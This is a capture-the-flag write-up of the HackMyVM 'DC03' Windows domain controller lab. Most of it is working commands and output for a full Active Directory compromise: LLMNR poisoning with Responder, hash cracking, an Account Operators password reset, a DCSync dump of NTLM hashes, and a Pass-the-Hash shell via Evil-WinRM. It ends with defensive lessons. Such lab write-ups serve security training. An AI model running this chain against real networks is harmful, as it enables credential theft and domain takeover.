# DC03 — HackMyVM Writeup

**Platform:** HackMyVM  
**OS:** Windows  
**Difficulty:** Medium  
**Author:** Shalopai  
**Techniques:** LLMNR Poisoning, NTLMv2 Hash Cracking, SMB Enumeration, LDAP Domain Dump, ACL Abuse (Account Operators), DCSync (NTDS Dump), Pass-the-Hash (Evil-WinRM)

---

## Summary

DC03 is a Windows Active Directory domain controller machine. The attack begins with LLMNR poisoning to capture an NTLMv2 hash from a domain user. After cracking the hash, we enumerate the AD environment using ldapdomaindump and discover a privilege escalation path through nested group membership: our user is a member of Account Operators, which allows us to reset the password of a user in the Operators group — which is itself a member of Domain Admins. With Domain Admin privileges we perform a DCSync attack to dump all NTLM hashes and authenticate as Administrator via Pass-the-Hash using Evil-WinRM.

## Reconnaissance

### Network Discovery

```bash
sudo netdiscover -r 192.168.56.0/24
```

Target identified at `192.168.56.126`.

Added to `/etc/hosts`:
```
192.168.56.126 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
```

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -Pn 192.168.56.126
```

**Key results:**

| Port | Service | Details |
|------|---------|---------|
| 53   | DNS     | Simple DNS Plus |

The presence of Kerberos (88), LDAP (389), and SMB (445) immediately identifies this as a **Windows Domain Controller**. The domain name `SOUPEDECODE.LOCAL` and DC hostname `DC01` are visible in the scan.

Port **5985 (WinRM)** is open — this will be useful later for remote shell access.

## Exploitation — LLMNR Poisoning

### What is LLMNR?

LLMNR (Link-Local Multicast Name Resolution) is a Windows protocol used to resolve hostnames when DNS fails. When a Windows machine can't find a host via DNS, it broadcasts an LLMNR query to the entire local network asking "does anyone know where FILESERVER is?".

The attack works as follows:
1. DC01 tries to connect to `FILESERVER` — DNS doesn't know it
2. DC01 broadcasts an LLMNR query to the network
3. Responder answers "I am FILESERVER, connect to me"
4. DC01 believes it and attempts an SMB connection
5. Windows **automatically sends NTLMv2 credentials** during SMB authentication
6. Responder captures the hash

### Running Responder

```bash
sudo responder -I eth0
```

After a few minutes, Responder captures the NTLMv2 hash of `xkate578`:

```
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:08638c7d1578dbfe:C197F9951BEEFF57...
```

### Cracking the Hash

```bash
echo "xkate578::soupedecode:08638c7d1578dbfe:..." > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
jesuschrist      (xkate578)
```

Credentials: `xkate578 : jesuschrist`

## Enumeration

### SMB Shares

```bash
netexec smb SOUPEDECODE.LOCAL -u 'xkate578' -p 'jesuschrist' --shares
```

```
Share           Permissions
-----           -----------
ADMIN$          
C$              
IPC$            READ
NETLOGON        READ
share           READ,WRITE
SYSVOL          READ
```

The `share` folder has READ/WRITE access — this is where the user flag is stored.

### User Flag

```bash
smbclient //SOUPEDECODE.LOCAL/share -U xkate578
smb: \> get user.txt
```

### LDAP Domain Dump

To map out the full AD environment and find privilege escalation paths:

```bash
ldapdomaindump -u 'SOUPEDECODE\xkate578' -p 'jesuschrist' 192.168.56.126
firefox domain_users_by_group.html
```

Reviewing the group memberships reveals a critical escalation path:

**Account Operators:**
| User | SAM Name |
|------|----------|
| Xenia Kate | xkate578 |

**Operators group:**
| User | SAM Name |
|------|----------|
| Fanny Beth | fbeth103 |

**Domain Admins:**
| Member | Type |
|--------|------|
| Administrator | User |
| **Operators** | **Group** |

### The Privilege Escalation Chain

```
xkate578 → Account Operators → can reset password of fbeth103
fbeth103 → Operators group → Operators is member of Domain Admins
∴ fbeth103 = Domain Admin
```

**Why can Account Operators reset fbeth103's password?**

The Account Operators group can create and modify most user accounts in the domain. The key exception is that they *cannot* modify accounts in protected groups like Domain Admins, Administrators, etc. However, the **Operators** group is a custom group — not a built-in protected group — so Account Operators *can* modify its members' passwords.

## Privilege Escalation

### Resetting fbeth103's Password

```bash
impacket-changepasswd SOUPEDECODE.LOCAL/fbeth103@192.168.56.126 \
  -altuser xkate578 \
  -altpass 'jesuschrist' \
  -newpass 'Pass1234!!' \
  -no-pass -reset
```

```
[*] Password was changed successfully.
```

### Verifying Domain Admin Access

```bash
netexec smb 192.168.56.126 -u fbeth103 -p 'Pass1234!!' -d SOUPEDECODE.LOCAL
```

```
[+] SOUPEDECODE.LOCAL\fbeth103:Pass1234!! (Pwn3d!)
```

`Pwn3d!` confirms fbeth103 has administrative access.

### DCSync — Dumping NTDS

With Domain Admin privileges, we perform a **DCSync attack** — forcing the DC to replicate (sync) its password database to us, just like a legitimate DC replication would:

```bash
netexec smb 192.168.56.126 -u fbeth103 -p 'Pass1234!!' --ntds
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
```

The Administrator NTLM hash is: `2176416a80e4f62804f101d3a55d6c93`

## Root Access — Pass-the-Hash via Evil-WinRM

### Why Evil-WinRM and not SMB?

Evil-WinRM gives us an **interactive PowerShell shell** over WinRM (port 5985), whereas SMB only lets us browse files. For a full shell where we can run commands, navigate the filesystem, and collect flags — Evil-WinRM is the right tool.

**Pass-the-Hash** means we authenticate using the NTLM hash directly, without ever needing to crack the Administrator password:

```bash
evil-winrm -i SOUPEDECODE.LOCAL -u 'Administrator' -H '2176416a80e4f62804f101d3a55d6c93'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
```

### Root Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
b8e59a7d4020792c412da75e589ff4fc
```

## Attack Chain Summary

1. **LLMNR Poisoning** — Responder intercepts NTLMv2 hash of `xkate578` when DC01 broadcasts a failed name resolution request
2. **Hash Cracking** — John the Ripper cracks the hash against rockyou.txt → `jesuschrist`
3. **SMB Enumeration** — netexec reveals a readable `share` folder containing the user flag
4. **LDAP Domain Dump** — ldapdomaindump maps group memberships, revealing the escalation chain: `xkate578 → Account Operators → can reset fbeth103 → fbeth103 → Operators → Domain Admins`
5. **ACL Abuse** — impacket-changepasswd resets fbeth103's password using xkate578's Account Operators privileges
6. **DCSync Attack** — fbeth103's Domain Admin access allows dumping all NTLM hashes from NTDS via netexec
7. **Pass-the-Hash** — Evil-WinRM authenticates as Administrator using the dumped hash, granting full DC access

## Lessons Learned

- **LLMNR should be disabled in production.** This is a well-known attack vector that still works in most corporate environments because LLMNR is enabled by default on Windows. Disabling it via Group Policy is a simple fix.
- **Nested group membership creates hidden attack paths.** The escalation here wasn't obvious — it required mapping that Operators → Domain Admins. BloodHound or ldapdomaindump are essential for visualising these chains.
- **Account Operators is a dangerous group.** Granting users this privilege allows them to reset passwords of non-protected accounts, which can lead to Domain Admin compromise as demonstrated here.
- **Pass-the-Hash works without knowing the plaintext password.** NTLM authentication accepts hashes directly — cracking the Administrator password wasn't necessary. This is why NTLM hash exposure is critical.
- **Evil-WinRM vs SMB** — SMB gives file access, WinRM gives an interactive shell. When port 5985 is open, Evil-WinRM is the preferred tool for post-exploitation.
